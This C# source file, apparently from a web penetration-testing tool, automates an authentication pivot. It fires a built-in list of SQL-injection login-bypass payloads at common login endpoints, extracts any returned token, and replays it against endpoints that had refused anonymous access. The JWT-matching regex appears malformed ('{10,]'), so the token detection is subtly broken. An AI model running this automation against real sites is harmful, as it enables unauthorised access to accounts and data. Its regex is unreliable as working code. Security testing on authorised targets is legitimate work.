using System.Text.Json;
using System.Text.RegularExpressions;
using System.Web;
using Trowser.Automation;

namespace Trowser.Security;

/// <summary>
/// Retests endpoints that reject anonymous callers using a captured bearer token, cookie, or SQLi bypass token.
/// </summary>
public static class AuthenticatedPivotService
{
    public sealed class PivotOptions
    {
        public string? Host { get; set; }
        public string? Token { get; set; }
        public int MaxEndpoints { get; set; } = 20;
        public int TimeoutMs { get; set; } = 15000;
        public bool TrySqliLoginBypass { get; set; } = true;
        public string? LoginUrl { get; set; }
        /// <summary>bearer (default), cookie, or auto.</summary>
        public string? AuthMode { get; set; }
        public string? CookieName { get; set; }
    }

    public sealed class PivotRow
    {
        public string Url { get; init; } = "";
        public int AnonStatus { get; init; }
        public int AuthStatus { get; init; }
        public string Outcome { get; init; } = "";
        public string Finding { get; init; } = "";
        public string Severity { get; init; } = "info";
        public string? Detail { get; init; }
    }

    public sealed class SqliAttemptRow
    {
        public string Url { get; init; } = "";
        public string Payload { get; init; } = "";
        public int Status { get; init; }
        public bool TokenCaptured { get; init; }
    }

    public sealed class PivotResult
    {
        public List<PivotRow> Rows { get; init; } = [];
        public List<string> Summary { get; init; } = [];
        public string? TokenSource { get; init; }
        public string? TokenType { get; init; }
        public int EndpointsRetested { get; init; }
        public int EndpointsUnlocked { get; init; }
        public List<SqliAttemptRow> SqliAttempts { get; init; } = [];
    }

    private static readonly string[] LoginPaths =
    [
        "/rest/user/login", "/api/login", "/login", "/auth/login", "/api/auth/login"
    ];

    private static readonly string[] SqliBypassPayloads =
    [
        "' OR 1=1--", "admin'--", "' OR '1'='1'--", "' OR 1=1#", "admin' OR '1'='1"
    ];

    private static readonly Regex JwtLike = new(
        @"[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,]",
        RegexOptions.Compiled);

    private static readonly HashSet<string> StaticExtensions = new(StringComparer.OrdinalIgnoreCase)
    {
        ".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2", ".map", ".webp"
    };

    public static async Task<PivotResult> RunAsync(
        AutomationContext ctx,
        PivotOptions options,
        CancellationToken ct = default)
    {
        var sqliAttempts = new List<SqliAttemptRow>();
        var token = options.Token?.Trim();
        string? tokenSource = !string.IsNullOrWhiteSpace(token) ? "explicit" : null;
        var authMode = (options.AuthMode ?? "auto").Trim().ToLowerInvariant();

        if (string.IsNullOrWhiteSpace(token))
        {
            var analyzed = await HttpSecurityProbes.RunJwtAnalyzeAsync(ctx, null, ct);
            token = analyzed.Tokens.FirstOrDefault()?.Raw;
            tokenSource = analyzed.Tokens.FirstOrDefault()?.Source;
            if (!string.IsNullOrWhiteSpace(token))
                authMode = "bearer";
        }

        if (string.IsNullOrWhiteSpace(token) && options.TrySqliLoginBypass)
        {
            var (sqliToken, sqliSource, attempts) = await TryCaptureTokenViaSqliBypassAsync(ctx, options, ct);
            sqliAttempts = attempts;
            token = sqliToken;
            tokenSource = sqliSource;
            if (!string.IsNullOrWhiteSpace(token))
                authMode = "bearer";
        }

        if (string.IsNullOrWhiteSpace(token))
        {
            var summary = new List<string>();
            if (options.TrySqliLoginBypass)
            {
                summary.Add(sqliAttempts.Count > 0
                    ? $"SQLi login bypass attempted on {sqliAttempts.Count} request(s) — no token captured."
                    : "SQLi login bypass enabled but no login URL could be resolved (pass loginUrl or browse the app first).");
            }
            else
            {
                summary.Add("No token available — pass token, browse while logged in, or set trySqliLoginBypass: true.");
            }

            return new PivotResult
            {
                Summary = summary,
                TokenSource = null,
                SqliAttempts = sqliAttempts
            };
        }

        authMode = ResolveAuthMode(authMode, token);
        var authHeaders = BuildAuthHeaders(token, authMode, options.CookieName);

        var targets = DiscoverRetestTargets(ctx, options);
        var rows = new List<PivotRow>();

        foreach (var url in targets)
        {
            ct.ThrowIfCancellationRequested();
            var anon = await SecurityProbeHttp.FetchAsync(ctx, url, "GET", null, null, options.TimeoutMs, includeBrowserCookies: false, ct);
            var authed = await SecurityProbeHttp.FetchAsync(ctx, url, "GET", authHeaders, null, options.TimeoutMs, includeBrowserCookies: false, ct);

            string outcome;
            string finding;
            string severity;
            string detail;

            if (anon.Status is >= 200 and < 300)
            {
                outcome = "ANON_ALREADY_OK";
                finding = "SKIPPED";
                severity = "info";
                detail = $"Anonymous request already returned {anon.Status}.";
            }
            else if (authed.Status is >= 200 and < 300)
            {
                outcome = "UNLOCKED";
                finding = "AUTH_BYPASS_PIVOT";
                severity = "critical";
                detail = $"Anonymous {anon.Status} → authenticated {authed.Status} using {authMode} credential.";
            }
            else
            {
                outcome = "STILL_DENIED";
                finding = "NO_UNLOCK";
                severity = "info";
                detail = $"Anonymous {anon.Status} → authenticated {authed.Status} (still denied).";
            }

            rows.Add(new PivotRow
            {
                Url = url,
                AnonStatus = anon.Status,
                AuthStatus = authed.Status,
                Outcome = outcome,
                Finding = finding,
                Severity = severity,
                Detail = detail
            });
        }

        var unlocked = rows.Count(r => r.Outcome == "UNLOCKED");
        var summaryOut = new List<string>();
        if (unlocked > 0)
            summaryOut.Add($"{unlocked} endpoint(s) unlocked by authenticated pivot.");
        else if (targets.Count == 0)
            summaryOut.Add("No retest candidates found — browse pages that return 401/403 or pass explicit endpoint URLs in the network log.");
        else
            summaryOut.Add($"Retested {targets.Count} endpoint(s); none unlocked with the provided credential.");

        return new PivotResult
        {
            Rows = rows,
            Summary = summaryOut,
            TokenSource = tokenSource,
            TokenType = authMode,
            EndpointsRetested = targets.Count,
            EndpointsUnlocked = unlocked,
            SqliAttempts = sqliAttempts
        };
    }

    private static List<string> DiscoverRetestTargets(AutomationContext ctx, PivotOptions options)
    {
        var urls = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var entry in ctx.Network.Entries)
        {
            if (!SecurityHostScope.MatchesHostFilter(entry.Host, options.Host))
                continue;
            if (entry.StatusCode is not (401 or 403))
                continue;
            if (!IsHttpUrl(entry.Url))
                continue;
            if (IsStaticUrl(entry.Url))
                continue;
            urls.Add(NormalizeRetestUrl(entry.Url));
        }

        var mapper = new AttackSurfaceMapper();
        var surface = mapper.Analyze(ctx.Network.Entries, includeAuth: true, hostFilter: options.Host);
        foreach (var ep in surface.Endpoints)
        {
            if (!ep.Methods.Contains("GET")) continue;
            if (ep.ResponsePatterns.ContainsKey("401") || ep.ResponsePatterns.ContainsKey("403"))
            {
                if (IsHttpUrl(ep.Url) && !IsStaticUrl(ep.Url))
                    urls.Add(NormalizeRetestUrl(ep.Url));
            }
        }

        return urls.Take(Math.Max(1, options.MaxEndpoints)).ToList();
    }

    private static string NormalizeRetestUrl(string url)
    {
        if (!Uri.TryCreate(url, UriKind.Absolute, out var uri))
            return url;
        // Preserve non-default ports (Authority includes host:port). Stripping the port
        // made localhost:3010 retests hit localhost:80 and fail with connection refused.
        return $"{uri.Scheme}://{uri.Authority}{uri.AbsolutePath}";
    }

    private static bool IsHttpUrl(string url) =>
        Uri.TryCreate(url, UriKind.Absolute, out var u)
        && u.Scheme is "http" or "https"
        && !u.AbsolutePath.StartsWith("/data:", StringComparison.OrdinalIgnoreCase);

    private static bool IsStaticUrl(string url)
    {
        if (!Uri.TryCreate(url, UriKind.Absolute, out var uri)) return true;
        var ext = System.IO.Path.GetExtension(uri.AbsolutePath);
        return !string.IsNullOrEmpty(ext) && StaticExtensions.Contains(ext);
    }

    private static string ResolveAuthMode(string authMode, string token)
    {
        if (authMode is "bearer" or "cookie") return authMode;
        if (token.Contains('=') && !token.Contains('.'))
            return "cookie";
        if (JwtLike.IsMatch(token))
            return "bearer";
        if (token.Contains(';'))
            return "cookie";
        return "bearer";
    }

    private static Dictionary<string, string> BuildAuthHeaders(string token, string authMode, string? cookieName)
    {
        var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        if (authMode == "cookie")
        {
            if (token.Contains('='))
                headers["Cookie"] = token;
            else
                headers["Cookie"] = $"{cookieName ?? "session"}={token}";
        }
        else
        {
            headers["Authorization"] = token.StartsWith("Bearer ", StringComparison.OrdinalIgnoreCase)
                ? token
                : $"Bearer {token}";
        }
        return headers;
    }

    private static async Task<(string? token, string? source, List<SqliAttemptRow> attempts)> TryCaptureTokenViaSqliBypassAsync(
        AutomationContext ctx,
        PivotOptions options,
        CancellationToken ct)
    {
        var attempts = new List<SqliAttemptRow>();
        var loginUrls = new List<string>();
        if (!string.IsNullOrWhiteSpace(options.LoginUrl))
            loginUrls.Add(options.LoginUrl.Trim());
        else
        {
            var pageUrl = await ctx.GetCurrentUrl();
            if (Uri.TryCreate(pageUrl, UriKind.Absolute, out var baseUri))
            {
                var origin = baseUri.GetLeftPart(UriPartial.Authority);
                loginUrls.AddRange(LoginPaths.Select(p => origin + p));
            }
        }

        foreach (var url in loginUrls.Distinct(StringComparer.OrdinalIgnoreCase))
        {
            foreach (var payload in SqliBypassPayloads)
            {
                ct.ThrowIfCancellationRequested();
                foreach (var (body, contentType) in LoginBodies(payload))
                {
                    var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
                    {
                        ["Content-Type"] = contentType
                    };
                    var resp = await SecurityProbeHttp.FetchAsync(ctx, url, "POST", headers, body, options.TimeoutMs, includeBrowserCookies: false, ct);
                    var captured = ExtractTokenFromBody(resp.Body);
                    attempts.Add(new SqliAttemptRow
                    {
                        Url = url,
                        Payload = payload,
                        Status = resp.Status,
                        TokenCaptured = captured != null
                    });
                    if (captured != null)
                        return (captured, $"sqli-login-bypass:{url}", attempts);
                }
            }
        }

        return (null, null, attempts);
    }

    private static IEnumerable<(string body, string contentType)> LoginBodies(string emailPayload)
    {
        yield return (JsonSerializer.Serialize(new { email = emailPayload, password = "x" }), "application/json");
        yield return ($"email={HttpUtility.UrlEncode(emailPayload)}&password=x", "application/x-www-form-urlencoded");
        yield return ($"username={HttpUtility.UrlEncode(emailPayload)}&password=x", "application/x-www-form-urlencoded");
    }

    private static string? ExtractTokenFromBody(string body)
    {
        if (string.IsNullOrWhiteSpace(body)) return null;
        foreach (Match m in JwtLike.Matches(body))
            return m.Value;

        try
        {
            using var doc = JsonDocument.Parse(body);
            var root = doc.RootElement;
            foreach (var path in new[] { "token", "access_token", "jwt", "authentication.token", "data.token" })
            {
                if (TryGetPath(root, path, out var val) && val.ValueKind == JsonValueKind.String)
                {
                    var s = val.GetString();
                    if (!string.IsNullOrEmpty(s) && s.Length > 8)
                        return s;
                }
            }
        }
        catch
        {
            // ignore
        }

        return null;
    }

    private static bool TryGetPath(JsonElement root, string dottedPath, out JsonElement value)
    {
        value = root;
        foreach (var segment in dottedPath.Split('.'))
        {
            if (value.ValueKind != JsonValueKind.Object || !value.TryGetProperty(segment, out value))
                return false;
        }
        return true;
    }
}
